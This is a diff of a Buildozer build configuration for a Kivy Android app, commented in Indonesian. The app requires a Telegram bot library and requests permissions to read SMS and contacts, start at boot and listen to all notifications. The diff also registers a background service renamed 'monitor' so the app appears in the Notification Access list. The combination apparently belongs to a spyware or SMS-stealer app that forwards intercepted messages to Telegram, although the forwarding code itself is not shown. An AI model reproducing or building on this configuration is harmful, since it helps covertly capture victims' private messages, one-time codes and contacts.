@@ -6,19 +6,17 @@ source.dir = .
 source.include_exts = py,png,jpg,kv,atlas
 version = 5.1
 
-# Library pendukung
+# Library wajib
 requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi
 
-# Izin lengkap untuk SMS, Kontak, dan Notifikasi
+# Izin dasar dan sistem
 android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS, BIND_NOTIFICATION_LISTENER_SERVICE
 
-# --- BAGIAN PENTING AGAR NAMA APK MUNCUL DI DAFTAR ---
-# Ini mendaftarkan layanan pendengar notifikasi ke sistem Android
-android.services = notification_service:main.py
-android.manifest.intent_filters = [("android.service.notification.NotificationListenerService", "android.intent.action.MAIN")]
-# ----------------------------------------------------
+# Pemicu agar nama APK muncul di daftar Akses Notifikasi
+android.services = monitor:main.py
 
-android.api = 28
+# Pengaturan API (Stabil untuk Android lama maupun baru)
+android.api = 31
 android.minapi = 21
 android.ndk = 25b
 android.private_storage = True
